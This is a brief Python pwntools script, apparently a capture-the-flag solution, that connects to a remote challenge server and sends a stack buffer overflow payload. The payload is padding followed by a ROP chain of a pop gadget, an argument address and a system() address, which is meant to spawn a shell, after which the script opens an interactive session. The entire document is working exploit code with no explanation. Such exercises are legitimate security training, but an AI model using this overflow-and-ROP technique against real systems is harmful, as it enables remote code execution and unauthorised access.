#!/usr/bin/env python
# coding=utf-8
from pwn import*
s=remote('pwn2.jarvisoj.com',9882)

t='A'*0x88
ad_sys=0x400603
ad_pop=0x4006b3
agre=0x600a90

payload=t+p64(ad_pop)+p64(agre)+p64(ad_sys)

s.sendline(payload)
s.interactive()
